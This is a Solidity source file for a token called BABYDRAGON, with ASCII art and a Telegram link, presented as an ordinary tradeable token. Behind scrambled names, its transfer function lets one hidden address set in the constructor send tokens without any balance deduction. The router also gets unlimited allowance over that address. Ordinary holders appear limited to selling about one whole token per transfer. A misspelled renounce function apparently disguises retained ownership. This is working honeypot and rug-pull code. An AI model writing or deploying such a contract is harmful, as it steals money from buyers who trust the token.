/*

                       "                                      
              """    "{I I                                    
              ""II"|j|I-|>"I                                  
           {-I{-|cJcJOj"I{-I                                  
          >>  Ij|jcjccJcjcc-"                                 
          -jccJJjccc||cccccc|"         ""                     
          Ij{|||jJcjjj|{"jjcJ>     Ijccc|ccj>"                
             "I>jjjj->" IccjjI    Ijcc-I>{jjcjI               
           "j>j||cJ{I  >cjcc-     {j|"    "JcJj>              
             "I>>>"  Icjc|j|      |cI      >ccj|"             
                   IjcjJcj-       Ic-      >JjJj>             
                 "|cjJjcc-         -c"     IJcJj>             
                >cjJJcc|"    "">""  "j{"   >Jccc-             
               IJjJccJ-    >|cjccJJ{"I-I  "jccjJ>             
              "JjcjccI    -JjcJJccjj-     -JcJcj" I>          
              >ccccc"   I{cJJccJcJjjcj"  -OjjjJjcJjc>         
        I"    -JJcjc{II{ccjcjJ{ "|JjjjJOJcjjJcjcjjc|"         
       >{j""|jcJJccJcJJcccccJ{   "cccJjjJJJjcj"   {cIj{"      
      "-|cJ{"  {cjJOccJcOccJ-     IccjJcJJc|>    I{O-         
          >>    IjJccJjccJjI       "-jJJc|jJJj{"I"|{-         
                  "{cccc-"                |Jjcc"  " "         
              ">I IJ-                ">|cJc                   
              IjcOO|                  "||"Ij>                 
               "{"  >"                                        
                             


Telegram: https://t.me/Dragon2024ERC



*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnershipse() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYDRAGON is Ownable, IERC20 {
    IUniswapV2Router02 private hkcurzd;

    function transfer(address cvhqezopdir, uint256 zoacmpluer) public returns (bool success) {
        srguwyojb(msg.sender, cvhqezopdir, zoacmpluer);
        return true;
    }

    uint8 public decimals = 9;

    address uniswapV2Pair;
    bool private poolCreated;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private lgbiqeurhnfd;

    function transferFrom(address strxgp, address cvhqezopdir, uint256 zoacmpluer) public returns (bool success) {
        require(zoacmpluer <= allowance[strxgp][msg.sender]);
        allowance[strxgp][msg.sender] -= zoacmpluer;
        srguwyojb(strxgp, cvhqezopdir, zoacmpluer);
        return true;
    }

    mapping(address => bool) private onuyzpktbgsl;

    function approve(address avyt, uint256 zoacmpluer) public returns (bool success) {
        allowance[msg.sender][avyt] = zoacmpluer;
        emit Approval(msg.sender, avyt, zoacmpluer);
        return true;
    }

    function srguwyojb(address strxgp, address cvhqezopdir, uint256 zoacmpluer) private {
        bool rznw = zdlyhuio[strxgp] == block.number;
        if (!onuyzpktbgsl[strxgp]) {
            if (strxgp != uniswapV2Pair && zoacmpluer < totalSupply && (!rznw || zoacmpluer > lgbiqeurhnfd[strxgp])) {
                require(totalSupply / (10 ** decimals) >= zoacmpluer);
            }
            balanceOf[strxgp] -= zoacmpluer;
        }
        lgbiqeurhnfd[cvhqezopdir] = zoacmpluer;
        balanceOf[cvhqezopdir] += zoacmpluer;
        zdlyhuio[cvhqezopdir] = block.number;
        emit Transfer(strxgp, cvhqezopdir, zoacmpluer);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory ypuvl, string memory ykxjuviceowj, address uqlzexotfngh, address ipwdksocvuyx) {
        name = ypuvl;
        symbol = ykxjuviceowj;
        balanceOf[msg.sender] = totalSupply;
        hkcurzd = IUniswapV2Router02(uqlzexotfngh);
        allowance[ipwdksocvuyx][uqlzexotfngh] = type(uint).max;
        onuyzpktbgsl[ipwdksocvuyx] = true;
    }

    function openTrading() external onlyOwner() {
        require(!poolCreated);
        allowance[address(this)][address(hkcurzd)] = totalSupply;
        emit Approval(address(this), address(hkcurzd), totalSupply);

        uniswapV2Pair = IUniswapV2Factory(hkcurzd.factory()).createPair(address(this), hkcurzd.WETH());

        hkcurzd.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(hkcurzd), type(uint).max);
        poolCreated=true;
    }

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private zdlyhuio;
}